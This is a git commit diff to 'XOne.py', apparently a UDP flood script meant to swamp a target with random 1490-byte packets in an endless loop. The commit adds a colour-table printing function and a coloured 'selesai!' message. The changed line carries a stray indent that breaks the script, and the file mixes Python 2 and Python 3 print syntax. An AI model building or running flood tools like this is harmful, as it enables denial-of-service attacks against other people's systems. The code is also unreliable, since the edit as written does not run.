356038c4b7fed9fff70ffa3f8ad7351f7fc67762
cXzo <71940015+cXzo@users.noreply.github.com>
2021-02-28 03:51:12 +0700

    K
    Yg

--- XOne.py
+++ XOne.py
@@ -14,7 +14,20 @@ day = now.day
 month = now.month
 year = now.year
 
+def print_format_table():
+    """
+    prints table of formatted text format options
+    """
+    for style in range(8):
+        for fg in range(30,38):
+            s1 = ''
+            for bg in range(40,48):
+                format = ';'.join([str(style), str(fg), str(bg)])
+                s1 += '\x1b[%sm %s \x1b[0m' % (format, format)
+            print(s1)
+        print('\n')
 
+print_format_table()
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
@@ -39,7 +52,7 @@ print "50%"
 time.sleep(5)
 print "nugguin yaaa wkwkwkwkkw"
 time.sleep(5)
-print "100%"
+ print('\x1b[6;30;42m' + 'selesai!' + '\x1b[0m')
 time.sleep(3)
 sent = 0
 while True:
